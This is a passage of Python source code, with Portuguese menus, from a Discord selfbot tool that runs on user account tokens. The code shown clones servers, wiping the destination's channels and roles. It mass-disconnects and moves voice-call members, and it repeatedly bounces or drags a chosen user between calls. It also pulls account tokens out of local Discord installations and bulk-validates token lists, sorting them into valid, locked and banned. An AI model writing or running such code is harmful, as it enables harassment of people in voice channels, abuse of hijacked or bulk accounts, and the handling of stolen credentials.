                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Continuar nao apaga o destino de novo; ele usa o progresso salvo.")
                    else:
                        print(f"  {BRANCO}as   Isso vai APAGAR todos os canais e roles do servidor de destino!{NC}")
                    confirm = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Prosseguir com a clonagem (s/n): ")

                    if confirm.strip().lower() in ("s", "sim", "y", "yes"):
                        try:
                            await run_clone_with_rate_limit(
                                clone_session, clone_token, source_id, dest_id,
                                resume_progress=resume_clone,
                                media_rate_limit_handler=ask_media_rate_limit_action,
                            )
                        except Exception as e:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clone interrompido por erro inesperado: {e}")
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Se havia progresso salvo, voce pode retomar pela opcao 9.")
                    else:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clonagem cancelada.")

                    if acc_choice == "2":
                        await clone_session.close()

                elif clone_mode == "2":
                    # Modo bot (la selfbot, escreve bot)
                    bot_token_input = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Token do bot: ")
                    bot_token_input = bot_token_input.strip()
                    if not bot_token_input:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio.")
                        await wait_enter()
                        continue

                    print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando servidores...")
                    read_session = bot.session
                    read_token = bot.token
                    bot_session = aiohttp.ClientSession()

                    source_info = await _clone_api_get(read_session, read_token, f"/guilds/{source_id}")

                    dest_url = f"{API_BASE}/guilds/{dest_id}"
                    dest_info = None
                    try:
                        async with bot_session.get(dest_url, headers=get_bot_headers(bot_token_input, with_content_type=False)) as resp:
                            if resp.status == 200:
                                dest_info = await resp.json()
                    except Exception:
                        pass

                    if not source_info:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de origem com sua conta.")
                        await bot_session.close()
                        await wait_enter()
                        continue
                    if not dest_info:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel acessar o servidor de destino com o bot.")
                        await bot_session.close()
                        await wait_enter()
                        continue

                    source_name = source_info.get("name", "Desconhecido")
                    dest_name = dest_info.get("name", "Desconhecido")

                    print()
                    print(f"  \033[92m*\033[0m Servidores identificados!")
                    print(f"  {BRANCO}Origem:{NC}  {ROXO}{source_name}{NC} ({source_id}) -> lido com {bot.username}")
                    print(f"  {BRANCO}Destino:{NC} {ROXO}{dest_name}{NC} ({dest_id}) -> escrito via bot")
                    resume_clone = True if saved_clone else await choose_clone_resume(source_id, dest_id, is_bot=True)
                    if resume_clone is None:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clonagem cancelada.")
                        await bot_session.close()
                        await wait_enter()
                        continue
                    print()
                    if resume_clone:
                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Continuar nao apaga o destino de novo; ele usa o progresso salvo.")
                    else:
                        print(f"  {BRANCO}as   Isso vai APAGAR todos os canais e roles do servidor de destino!{NC}")
                    confirm = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Prosseguir com a clonagem (s/n): ")

                    if confirm.strip().lower() in ("s", "sim", "y", "yes"):
                        try:
                            await run_clone_with_rate_limit(
                                read_session, read_token, source_id, dest_id,
                                write_session=bot_session,
                                write_token=bot_token_input,
                                write_headers_fn=get_bot_headers,
                                is_bot=True,
                                resume_progress=resume_clone,
                                media_rate_limit_handler=ask_media_rate_limit_action,
                            )
                        except Exception as e:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clone interrompido por erro inesperado: {e}")
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Se havia progresso salvo, voce pode retomar pela opcao 9.")
                    else:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Clonagem cancelada.")

                    await bot_session.close()

                await wait_enter()

            elif choice == "10":
                # Submenu: Utilidades em Call
                while True:
                    clear_screen()
                    show_banner()
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print(f"  {BRANCO}Utilidades em Call{NC}")
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print()
                    print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Mover todos de 1 canal")
                    print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Mover todos de 1 canal (loop/elevador)")
                    print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  Desconectar todos de 1 canal")
                    print(f"  {BRANCO}[{ROXO}4{BRANCO}]{NC}  Desconectar todos do servidor")
                    print(f"  {BRANCO}[{ROXO}5{BRANCO}]{NC}  Elevador (1 user em calls aleatorias)")
                    print(f"  {BRANCO}[{ROXO}6{BRANCO}]{NC}  Coleira (user segue voce nas calls)")
                    print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")
                    print(f"  {AZUL}  {'-' * 52}{NC}")
                    vc_sub = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                    vc_sub = vc_sub.strip()

                    if vc_sub == "0" or not vc_sub:
                        break

                    elif vc_sub == "1":
                        # Mover todos de 1 canal para outro
                        from_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal de origem: ")
                        from_id = from_id.strip()
                        if not from_id:
                            continue
                        to_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal de destino: ")
                        to_id = to_id.strip()
                        if not to_id:
                            continue

                        # Resolve guild_id do canal de origem
                        ch_info = await bot.api_get_channel(from_id)
                        if not ch_info or not ch_info.get("guild_id"):
                            print(f"  [!] Canal de origem invalido.")
                            await wait_enter()
                            continue
                        guild_id = ch_info["guild_id"]

                        members = await bot.get_voice_members(from_id, guild_id)
                        if not members:
                            print(f"  [!] Nenhum membro encontrado no canal (cache pode estar vazio, entre no servidor primeiro).")
                            await wait_enter()
                            continue

                        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Movendo {len(members)} membro(s)...")
                        moved = 0
                        for m in members:
                            uid = m["user_id"]
                            if uid == bot.user_id:
                                continue
                            ok = await bot.move_member(guild_id, uid, to_id)
                            if ok:
                                moved += 1
                                print(f"  \033[92m*\033[0m Movido: {uid}")
                            else:
                                print(f"  [!] Falha ao mover: {uid}")
                            await asyncio.sleep(get_delay_single("voice_move"))
                        print(f"\n  \033[92m*\033[0m {moved} membro(s) movido(s)!")
                        await wait_enter()

                    elif vc_sub == "2":
                        # Mover todos de 1 canal em loop (elevador geral)
                        from_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal de origem: ")
                        from_id = from_id.strip()
                        if not from_id:
                            continue

                        ch_info = await bot.api_get_channel(from_id)
                        if not ch_info or not ch_info.get("guild_id"):
                            print(f"  [!] Canal invalido.")
                            await wait_enter()
                            continue
                        guild_id = ch_info["guild_id"]

                        voice_channels = await bot.get_guild_voice_channels(guild_id)
                        if len(voice_channels) < 2:
                            print(f"  [!] Servidor precisa ter pelo menos 2 canais de voz.")
                            await wait_enter()
                            continue

                        members = await bot.get_voice_members(from_id, guild_id)
                        if not members:
                            print(f"  [!] Nenhum membro encontrado no canal.")
                            await wait_enter()
                            continue

                        member_ids = [m["user_id"] for m in members if m["user_id"] != bot.user_id]
                        if not member_ids:
                            print(f"  [!] Nenhum membro para mover.")
                            await wait_enter()
                            continue

                        other_channels = [ch for ch in voice_channels if ch["id"] != from_id]

                        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Elevador iniciado com {len(member_ids)} membro(s)!")
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Pressione ENTER para parar...")
                        print()

                        bot._elevator_running = True
                        move_count = 0

                        async def elevator_loop():
                            nonlocal move_count
                            while bot._elevator_running:
                                for uid in member_ids:
                                    if not bot._elevator_running:
                                        break
                                    target_ch = random.choice(other_channels)
                                    ok = await bot.move_member(guild_id, uid, target_ch["id"])
                                    if ok:
                                        move_count += 1
                                        if move_count % 10 == 0 or move_count == 1:
                                            print(f"  [{move_count}] Movido {uid} -> #{target_ch.get('name', '')}")
                                    await asyncio.sleep(get_delay_single("elevator_group"))

                        task = asyncio.create_task(elevator_loop())
                        await prompt_input("")
                        bot._elevator_running = False
                        await asyncio.sleep(0.5)
                        task.cancel()
                        print(f"\n  \033[92m*\033[0m Elevador parado! {move_count} movimentos realizados.")
                        await wait_enter()

                    elif vc_sub == "3":
                        # Desconectar todos de 1 canal
                        ch_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do canal de voz: ")
                        ch_id = ch_id.strip()
                        if not ch_id:
                            continue

                        ch_info = await bot.api_get_channel(ch_id)
                        if not ch_info or not ch_info.get("guild_id"):
                            print(f"  [!] Canal invalido.")
                            await wait_enter()
                            continue
                        guild_id = ch_info["guild_id"]

                        members = await bot.get_voice_members(ch_id, guild_id)
                        if not members:
                            print(f"  [!] Nenhum membro encontrado no canal.")
                            await wait_enter()
                            continue

                        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Desconectando {len(members)} membro(s)...")
                        kicked = 0
                        for m in members:
                            uid = m["user_id"]
                            if uid == bot.user_id:
                                continue
                            ok = await bot.disconnect_member(guild_id, uid)
                            if ok:
                                kicked += 1
                                print(f"  \033[92m*\033[0m Desconectado: {uid}")
                            else:
                                print(f"  [!] Falha: {uid}")
                            await asyncio.sleep(get_delay_single("voice_move"))
                        print(f"\n  \033[92m*\033[0m {kicked} membro(s) desconectado(s)!")
                        await wait_enter()

                    elif vc_sub == "4":
                        # Desconectar todos do servidor
                        srv_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do servidor: ")
                        srv_id = srv_id.strip()
                        if not srv_id:
                            continue

                        voice_channels = await bot.get_guild_voice_channels(srv_id)
                        if not voice_channels:
                            print(f"  [!] Nenhum canal de voz encontrado no servidor.")
                            await wait_enter()
                            continue

                        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Buscando membros em {len(voice_channels)} canal(is) de voz...")
                        total_kicked = 0
                        for vc in voice_channels:
                            members = await bot.get_voice_members(vc["id"], srv_id)
                            for m in members:
                                uid = m["user_id"]
                                if uid == bot.user_id:
                                    continue
                                ok = await bot.disconnect_member(srv_id, uid)
                                if ok:
                                    total_kicked += 1
                                    print(f"  \033[92m*\033[0m Desconectado: {uid} de #{vc.get('name', '')}")
                                else:
                                    print(f"  [!] Falha: {uid}")
                                await asyncio.sleep(get_delay_single("voice_move"))
                        print(f"\n  \033[92m*\033[0m {total_kicked} membro(s) desconectado(s) do servidor!")
                        await wait_enter()

                    elif vc_sub == "5":
                        # Elevador: 1 user em calls aleatorias
                        user_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do usuario: ")
                        user_id = user_id.strip()
                        if not user_id:
                            continue
                        srv_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do servidor: ")
                        srv_id = srv_id.strip()
                        if not srv_id:
                            continue

                        voice_channels = await bot.get_guild_voice_channels(srv_id)
                        if len(voice_channels) < 2:
                            print(f"  [!] Servidor precisa ter pelo menos 2 canais de voz.")
                            await wait_enter()
                            continue

                        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Elevador iniciado para {user_id}!")
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Pressione ENTER para parar...")
                        print()

                        bot._elevator_running = True
                        move_count = 0

                        async def user_elevator_loop():
                            nonlocal move_count
                            while bot._elevator_running:
                                target_ch = random.choice(voice_channels)
                                ok = await bot.move_member(srv_id, user_id, target_ch["id"])
                                if ok:
                                    move_count += 1
                                    if move_count % 10 == 0 or move_count == 1:
                                        print(f"  [{move_count}] -> #{target_ch.get('name', '')}")
                                await asyncio.sleep(get_delay_single("elevator_user"))

                        task = asyncio.create_task(user_elevator_loop())
                        await prompt_input("")
                        bot._elevator_running = False
                        await asyncio.sleep(0.5)
                        task.cancel()
                        print(f"\n  \033[92m*\033[0m Elevador parado! {move_count} movimentos.")
                        await wait_enter()

                    elif vc_sub == "6":
                        # Coleira: user segue voce nas calls
                        if bot._leash_running:
                            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Desativando coleira de {bot._leash_target}...")
                            bot.stop_leash()
                            print(f"  \033[92m*\033[0m Coleira desativada!")
                            await wait_enter()
                            continue

                        user_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do usuario para colocar na coleira: ")
                        user_id = user_id.strip()
                        if not user_id:
                            continue
                        if user_id == bot.user_id:
                            print(f"  [!] Voce nao pode colocar voce mesmo na coleira.")
                            await wait_enter()
                            continue

                        srv_id = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} ID do servidor da coleira: ")
                        srv_id = srv_id.strip()
                        if not srv_id:
                            print(f"  [!] ID do servidor vazio.")
                            await wait_enter()
                            continue

                        voice_channels = await bot.get_guild_voice_channels(srv_id)
                        if not voice_channels:
                            print(f"  [!] Nenhum canal de voz encontrado nesse servidor, ou sem acesso.")
                            await wait_enter()
                            continue

                        bot.start_leash(user_id, guild_id=srv_id)
                        print(f"  \033[92m*\033[0m Coleira ativada para {user_id}!")
                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Servidor monitorado: {srv_id} ({len(voice_channels)} canal(is) de voz)")
                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Quando voce mudar de call, ele sera puxado junto.")
                        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Para desativar, entre na opcao 6 novamente.")
                        if bot.voice_channel_id and bot.voice_guild_id == srv_id:
                            await bot._leash_follow(bot.voice_channel_id, bot.voice_guild_id)
                        else:
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Entre em uma call para iniciar o puxao.")
                        await wait_enter()

                    else:
                        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Opcao invalida.")
                        await asyncio.sleep(1)

            elif choice == "0":
                # Submenu: Central da Conta (tela limpa)
                while True:
                    clear_screen()
                    show_banner()
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print(f"  {BRANCO}Central da Conta{NC}")
                    print(f"  {BRANCO}{'-' * 58}{NC}")
                    print()
                    print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  Adicionar conta")
                    print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  Trocar conta ativa")
                    print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  Remover conta")
                    print(f"  {BRANCO}[{ROXO}4{BRANCO}]{NC}  Importar tokens do Discord local")
                    print(f"  {BRANCO}[{ROXO}5{BRANCO}]{NC}  Validar tokens de arquivo")
                    print(f"  {BRANCO}[{ROXO}6{BRANCO}]{NC}  Login no Discord App")
                    print(f"  {BRANCO}[{ROXO}7{BRANCO}]{NC}  insignia HypeSquad")
                    print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Voltar")
                    print(f"  {AZUL}  {'-' * 52}{NC}")
                    sub = await prompt_input(f"\n  {BRANCO}[{AZUL}>{BRANCO}]{NC} Escolha: ")
                    sub = sub.strip()

                    if sub == "0" or not sub:
                        break

                    elif sub == "1":
                        new_token = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Cole o novo token: ")
                        new_token = new_token.strip()
                        if new_token:
                            # Verifica se o token valido antes de adicionar
                            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando token...")
                            try:
                                async with aiohttp.ClientSession() as check_session:
                                    async with check_session.get(
                                        f"{API_BASE}/users/@me",
                                        headers=get_headers(new_token, with_content_type=False)
                                    ) as resp:
                                        if resp.status == 200:
                                            user_data = await resp.json()
                                            uname = user_data.get("username", "")
                                            if add_token_to_config(new_token):
                                                update_username_in_config(new_token, uname)
                                                print(f"  \033[92m*\033[0m Token valido! Conta: {BRANCO}{uname}{NC} -> adicionada ao config.")
                                                print(f"  {BRANCO}Use 'Trocar conta ativa' para conectar nela.{NC}")
                                            else:
                                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token ja existe no config.")
                                        elif resp.status == 401:
                                            print(f"  {c.R}[x]{c.X} Token invalido ou expirado.")
                                        elif resp.status == 403:
                                            print(f"  {c.R}[x]{c.X} Token bloqueado (conta suspensa/desativada).")
                                        else:
                                            print(f"  {c.R}[x]{c.X} Erro ao verificar token (HTTP {resp.status}).")
                            except Exception as e:
                                print(f"  {c.R}[x]{c.X} Erro de conexao: {e}")
                        else:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Token vazio.")
                        await wait_enter()

                    elif sub == "2":
                        cfg = load_config()
                        entries = cfg.get("tokens", [])
                        if len(entries) < 2:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} So ha 1 conta no config.")
                            await wait_enter()
                            continue
                        print()
                        for i, entry in enumerate(entries, 1):
                            uname = entry.get("username") or "(sem nome)"
                            marker = f" {ROXO}[ativa]{NC}" if entry.get("token") == bot.token else ""
                            print(f"  {BRANCO}[{ROXO}{i}{BRANCO}]{NC}  {uname}{marker}")
                        idx_str = await prompt_input(f"\n  {BRANCO}[{AZUL}{BRANCO}]{NC} Numero da conta: ")
                        try:
                            idx = int(idx_str.strip()) - 1
                            if 0 <= idx < len(entries):
                                new_token = entries[idx]["token"]
                                if new_token == bot.token:
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Essa conta ja esta ativa.")
                                else:
                                    new_uname = entries[idx].get("username") or ""
                                    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Desconectando de {bot.username}...")
                                    # Desconecta a conta atual
                                    await bot.stop()
                                    # Cria e conecta a nova conta
                                    new_bot = SelfBot(new_token, label="")
                                    bots.clear()
                                    bots.append(new_bot)
                                    asyncio.create_task(new_bot.start())
                                    set_active_token(new_token)
                                    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Conectando a {new_uname}...")
                                    # Espera ate conectar (max 15s)
                                    for _ in range(30):
                                        await asyncio.sleep(0.5)
                                        if new_bot.user_id and new_bot.session:
                                            break
                                    if new_bot.user_id:
                                        bot = new_bot
                                        print(f"  \033[92m*\033[0m Conta trocada para {BRANCO}{bot.username}{NC}")
                                    else:
                                        bot = new_bot
                                        print(f"  {c.Y}[!]{c.X} Conectando em segundo plano...")
                            else:
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Numero invalido.")
                        except ValueError:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Entrada invalida.")
                        await wait_enter()

                    elif sub == "3":
                        # Submenu: Remover conta
                        async def _sync_after_account_removal():
                            nonlocal bot
                            cfg_after = load_config()
                            remaining_entries = cfg_after.get("tokens", [])

                            # Sem contas restantes: encerra o terminal automaticamente.
                            if not remaining_entries:
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhuma conta restante no config.")
                                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Encerrando terminal...")
                                await asyncio.sleep(1.2)
                                os._exit(0)

                            remaining_tokens = [e.get("token") for e in remaining_entries if e.get("token")]
                            if bot.token in remaining_tokens:
                                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Menu atualizado automaticamente.")
                                return

                            # Conta ativa foi removida: troca automaticamente para a primeira restante.
                            new_token = remaining_entries[0]["token"]
                            new_uname = remaining_entries[0].get("username") or "(sem nome)"
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Conta ativa removida. Trocando automaticamente...")

                            await bot.stop()
                            new_bot = SelfBot(new_token, label="")
                            bots.clear()
                            bots.append(new_bot)
                            asyncio.create_task(new_bot.start())
                            set_active_token(new_token)
                            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Conectando a {new_uname}...")

                            for _ in range(30):
                                await asyncio.sleep(0.5)
                                if new_bot.user_id and new_bot.session:
                                    break

                            bot = new_bot
                            if new_bot.user_id:
                                print(f"  \033[92m*\033[0m Conta ativa atualizada para {BRANCO}{new_bot.username}{NC}.")
                            else:
                                print(f"  {c.Y}[!]{c.X} Nova conta conectando em segundo plano...")

                        while True:
                            cfg = load_config()
                            entries = cfg.get("tokens", [])
                            if not entries:
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhuma conta para remover.")
                                await wait_enter()
                                break

                            clear_screen()
                            show_banner()
                            print(f"  {BRANCO}{'-' * 58}{NC}")
                            print(f"  {BRANCO}Remover Conta{NC}")
                            print(f"  {BRANCO}{'-' * 58}{NC}")
                            print()
                            for i, entry in enumerate(entries, 1):
                                uname = entry.get("username") or "(sem nome)"
                                marker = f" {ROXO}[ativa]{NC}" if entry.get("token") == bot.token else ""
                                print(f"  {BRANCO}[{ROXO}{i}{BRANCO}]{NC}  {uname}{marker}")
                            print()
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Digite um numero para remover 1 conta.")
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Digite varios separados por virgula para remover varias.")
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Exemplo: 11 ou 11,2")
                            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Digite 99 para remocao em massa")
                            remove_str = await prompt_input(f"\n  {BRANCO}[{AZUL}{BRANCO}]{NC} Numero(s) para remover (0=voltar): ")
                            remove_str = remove_str.strip()

                            if remove_str == "0" or not remove_str:
                                break

                            if remove_str == "99":
                                keep_idx = None
                                keep_answer = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Deseja deixar alguma conta? (s/n): ")
                                keep_answer = keep_answer.strip().lower()

                                if keep_answer in ("s", "sim", "y", "yes"):
                                    keep_str = await prompt_input(f"  {BRANCO}[{AZUL}{BRANCO}]{NC} Numero(s) da(s) conta(s) para manter (ex: 5,7 | 0=nenhuma): ")
                                    keep_str = keep_str.strip()
                                    if keep_str and keep_str != "0":
                                        keep_parts = [p.strip() for p in keep_str.split(",") if p.strip()]
                                        if not keep_parts or any(not p.isdigit() for p in keep_parts):
                                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Use apenas numeros separados por virgula.")
                                            await asyncio.sleep(1.2)
                                            continue

                                        keep_nums = []
                                        for p in keep_parts:
                                            n = int(p)
                                            if n not in keep_nums:
                                                keep_nums.append(n)

                                        invalid_keep = [n for n in keep_nums if n < 1 or n > len(entries)]
                                        if invalid_keep:
                                            shown = ", ".join(str(n) for n in sorted(invalid_keep))
                                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Numero(s) invalido(s): {shown}")
                                            await asyncio.sleep(1.2)
                                            continue
                                        keep_idx = [n - 1 for n in keep_nums]
                                elif keep_answer in ("n", "nao", "não", "no"):
                                    keep_idx = []
                                else:
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Resposta invalida. Use s ou n.")
                                    await asyncio.sleep(1.2)
                                    continue

                                keep_set = set(keep_idx or [])
                                to_remove = [idx for idx in range(len(entries)) if idx not in keep_set]
                                if not to_remove:
                                    print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nada para remover.")
                                    await asyncio.sleep(1.2)
                                    continue

                                for idx in sorted(to_remove, reverse=True):
                                    remove_token_from_config(idx)

                                print(f"  \033[92m*\033[0m {len(to_remove)} conta(s) removida(s).")
                                if keep_set:
                                    kept_names = []
                                    for idx in sorted(keep_set):
                                        uname = entries[idx].get("username") or "(sem nome)"
                                        kept_names.append(uname)
                                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Conta(s) mantida(s): {', '.join(kept_names)}")
                                else:
                                    print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Nenhuma conta foi mantida.")
                                await _sync_after_account_removal()
                                await wait_enter()
                                continue

                            parts = [p.strip() for p in remove_str.split(",") if p.strip()]
                            if not parts:
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Entrada invalida.")
                                await asyncio.sleep(1.2)
                                continue

                            if any(not p.isdigit() for p in parts):
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Use apenas numeros separados por virgula.")
                                await asyncio.sleep(1.2)
                                continue

                            nums = [int(p) for p in parts]
                            invalid_nums = [n for n in nums if n < 1 or n > len(entries)]
                            if invalid_nums:
                                shown = ", ".join(str(n) for n in sorted(set(invalid_nums)))
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Numero(s) invalido(s): {shown}")
                                await asyncio.sleep(1.4)
                                continue

                            unique_nums = []
                            for n in nums:
                                if n not in unique_nums:
                                    unique_nums.append(n)

                            removed_names = []
                            for n in sorted(unique_nums, reverse=True):
                                removed = entries[n - 1]
                                uname = removed.get("username") or "(sem nome)"
                                removed_names.append(uname)
                                remove_token_from_config(n - 1)

                            removed_names.reverse()
                            print(f"  \033[92m*\033[0m {len(removed_names)} conta(s) removida(s): {', '.join(removed_names)}")
                            await _sync_after_account_removal()
                            await wait_enter()

                    elif sub == "4":
                        print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Escaneando instalacoes do Discord...")
                        found = extract_tokens_from_discord()
                        if not found:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum token encontrado nos Discord instalados.")
                            print(f"  {AZUL}  Certifique-se de que o Discord esta instalado e logado.{NC}")
                        else:
                            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} {len(found)} token(s) encontrado(s). Validando...\n")
                            imported = await validate_and_import_tokens(found, bots)
                            print(f"\n  \033[92m*\033[0m {imported} conta(s) nova(s) importada(s)!")
                            if imported > 0:
                                print(f"  {BRANCO}Use 'Trocar conta ativa' para conectar em outra conta.{NC}")
                        await wait_enter()

                    elif sub == "5":
                        # Listar arquivos .txt na pasta do bot
                        txt_files = [f for f in os.listdir(SCRIPT_DIR) if f.endswith(".txt")]
                        if not txt_files:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhum arquivo .txt encontrado na pasta.")
                            await wait_enter()
                            continue

                        print()
                        for i, fname in enumerate(txt_files, 1):
                            print(f"  {BRANCO}[{ROXO}{i}{BRANCO}]{NC}  {fname}")
                        print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  Cancelar")

                        file_idx = await prompt_input(f"\n  {BRANCO}[{AZUL}{BRANCO}]{NC} Numero do arquivo: ")
                        try:
                            idx = int(file_idx.strip())
                            if idx == 0:
                                continue
                            if idx < 1 or idx > len(txt_files):
                                print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Numero invalido.")
                                await wait_enter()
                                continue
                        except ValueError:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Entrada invalida.")
                            await wait_enter()
                            continue

                        filepath = os.path.join(SCRIPT_DIR, txt_files[idx - 1])
                        with open(filepath, "r", encoding="utf-8") as f:
                            lines = [l.strip() for l in f.readlines() if l.strip()]

                        if not lines:
                            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Arquivo vazio.")
                            await wait_enter()
                            continue

                        print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} {len(lines)} token(s) encontrado(s). Validando...\n")

                        valid_tokens_list = []
                        locked_tokens_list = []
                        invalid_count = 0

                        async with aiohttp.ClientSession() as check_session:
                            for ti, token in enumerate(lines, 1):
                                try:
                                    async with check_session.get(
                                        f"{API_BASE}/users/@me",
                                        headers=get_headers(token, with_content_type=False)
                                    ) as resp:
                                        if resp.status == 200:
                                            data = await resp.json()
                                            uname = data.get("username", "")
                                            phone = data.get("phone")
                                            verified = data.get("verified", False)

                                            # Verifica se a conta esta locked (precisa verificacao)
                                            async with check_session.get(
                                                f"{API_BASE}/users/@me/settings",
                                                headers=get_headers(token, with_content_type=False)
                                            ) as settings_resp:
                                                if settings_resp.status == 403:
                                                    locked_tokens_list.append(token)
                                                    flags_info = []
                                                    if not phone:
                                                        flags_info.append("sem telefone")
                                                    if not verified:
                                                        flags_info.append("email nao verificado")
                                                    flags_str = f" ({', '.join(flags_info)})" if flags_info else ""
                                                    print(f"  {c.Y}[!]{c.X} [{ti}/{len(lines)}] {BRANCO}{uname}{NC} -> {c.Y}locked (verificacao necessaria){c.X}{flags_str}")
                                                else:
                                                    valid_tokens_list.append(token)
                                                    info = []
                                                    if phone:
                                                        info.append("tel ok")
                                                    if verified:
                                                        info.append("email ok")
                                                    info_str = f" ({', '.join(info)})" if info else ""
                                                    print(f"  {c.GR}[ok]{c.X} [{ti}/{len(lines)}] {BRANCO}{uname}{NC} -> valido{info_str}")
                                        elif resp.status == 401:
                                            invalid_count += 1
                                            print(f"  {c.R}[x]{c.X} [{ti}/{len(lines)}] invalido/expirado")
                                        elif resp.status == 403:
                                            invalid_count += 1
                                            print(f"  {c.R}[x]{c.X} [{ti}/{len(lines)}] conta desativada/banida")
                                        else:
                                            invalid_count += 1
                                            print(f"  {c.R}[x]{c.X} [{ti}/{len(lines)}] HTTP {resp.status}")
                                except Exception as e:
                                    invalid_count += 1
                                    print(f"  {c.R}[x]{c.X} [{ti}/{len(lines)}] erro: {e}")
                                await asyncio.sleep(0.4)

                        # Reescreve o arquivo apenas com os validos (sem locked e sem invalidos)
                        with open(filepath, "w", encoding="utf-8") as f:
                            f.write("\n".join(valid_tokens_list))

                        print(f"\n  \033[92m*\033[0m {len(valid_tokens_list)} valido(s), {c.Y}{len(locked_tokens_list)} locked{c.X}, {c.R}{invalid_count} invalido(s){c.X}")
                        print(f"  {BRANCO}Arquivo atualizado: {txt_files[idx - 1]} (locked e invalidos removidos){NC}")
                        await wait_enter()

                    elif sub == "6":
                        # Login no Discord App via Console DevTools
